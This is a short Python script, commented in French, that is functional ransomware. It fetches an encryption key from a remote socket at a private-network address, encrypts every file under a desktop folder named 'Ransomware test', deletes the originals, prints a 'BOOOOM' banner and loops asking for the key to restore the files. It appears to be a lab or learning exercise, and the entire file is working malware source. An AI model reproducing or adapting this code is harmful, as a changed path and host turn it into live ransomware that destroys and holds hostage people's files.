from cryptography.fernet import  Fernet
import socket, os, pyfiglet

#fonction de criptation
def encrypt(path):
    with open(path, "rb") as normal_file:
        with open(path + "BOOOOM", "wb") as encrypted_file:
            encrypted_content = fn.encrypt(normal_file.read())
            encrypted_file.write(encrypted_content)
            encrypted_file.close()
        normal_file.close()
    os.remove(path)

    
#fonction de decriptation
def dycrypt(path):
    with open(path, "rb") as encrypted_file:
        with open(path[:-7], "wb") as normal_file:
            decrypted_content = fn.decrypt(encrypted_file.read())
            normal_file.write(decrypted_content)
            normal_file.close()
        encrypted_file.close()
    os.remove(path)


#cration de socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.56.1", 4321))
s.send(b'key')
key = s.recv(2048)
s.close()

#cration d'un objet de type Fernet
fn = Fernet(key)

# On va chiffrer les fichiers dans cette partie
for path, dirs, files in os.walk(r"C:\Users\Simo PC\Desktop\Ransomware test"):
    for f in files:
        encrypt(os.path.join(path, f))


# supprission de la clé
del key
del fn

# use pyfiglet
banner = pyfiglet.figlet_format("BOOOOM !!!!")
print(banner)

#pymant de raçon
while True:
    key = input("key == ")
    fn = Fernet(key)
    try:
        for path, dirs, files in os.walk(r"C:\Users\Simo PC\Desktop\Ransomware test"):
            for f in files:
                dycrypt(os.path.join(path, f))
                print(os.path.join(path, f), "restored")
    except Exception as e:
        print("Erreur--->", e)
    else:
        break